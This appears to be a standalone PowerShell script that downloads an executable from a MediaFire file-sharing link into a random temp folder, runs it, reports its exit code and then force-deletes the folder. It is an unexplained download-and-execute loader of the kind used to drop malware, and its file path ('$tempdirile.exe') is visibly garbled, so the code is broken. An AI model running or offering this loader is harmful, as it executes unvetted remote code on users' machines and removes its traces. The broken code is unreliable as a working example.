& {
    $url = "https://www.mediafire.com/file/hyxklk7j5zgjlkn/app.exe/file"
    $tempdir = "$env:TEMP\$(New-Guid)"
    mkdir $tempdir | Out-Null
    $file = "$tempdirile.exe"
    
    try {
        (irm -Uri $url -OutFile $file -ErrorAction Stop)
        $proc = Start-Process $file -PassThru -Wait
        "Process exited with code: $($proc.ExitCode)"
    }
    finally {
        ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue
    }
}
